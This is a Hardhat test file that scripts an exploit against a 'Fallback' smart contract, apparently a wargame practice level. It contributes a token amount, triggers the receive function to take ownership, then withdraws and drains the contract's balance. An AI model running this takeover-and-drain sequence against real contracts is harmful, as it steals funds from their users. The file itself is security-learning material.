import { expect } from "chai";
import { loadFixture } from "ethereum-waffle";
import { ethers } from "hardhat";

describe("Fallback contract exploit", () => {
  async function deployFallbackFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const Fallback = await ethers.getContractFactory("Fallback");
    const fallback = await Fallback.connect(deployer).deploy();
    return { deployer, attacker, fallback };
  }

  it("Should drain the contract", async () => {
    const { deployer, attacker, fallback } = await loadFixture(deployFallbackFixture);

    // Add contribution to the contract
    await fallback.connect(deployer).contribute({
      value: ethers.utils.parseUnits("100", "gwei"),
    });

    // Add contribution to the contract from attacker
    await fallback.connect(attacker).contribute({
      value: ethers.utils.parseUnits("1", "wei"),
    });

    // Send ether to contract without specifying msg.data
    // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
    const txReceipt = await attacker.sendTransaction({
      to: fallback.address,
      value: ethers.utils.parseUnits("1", "wei"),
    });
    await txReceipt.wait();

    // Check that attacker is the new owner now
    const newOwner = await fallback.owner();
    expect(attacker.address).to.equal(newOwner, "Owner did not change");

    const attackerContribution = await fallback.connect(attacker).getContribution();
    const attackerBalanceBeforeAttack = await attacker.getBalance();

    // Now attacker is the new owner, hence can withdraw all the ether from the contract
    await fallback.connect(attacker).withdraw();

    // Assert that contract balance is 0
    expect(await ethers.provider.getBalance(fallback.address)).to.equal("0", "Contract balance is not 0");

    const attackerBalanceAfterAttack = await attacker.getBalance();
    const increment = attackerBalanceAfterAttack.sub(attackerBalanceBeforeAttack);

    // The increment in attacker's balance should be greater than contributions
    //expect(increment.gt(attackerContribution)).to.be.true;
  });
});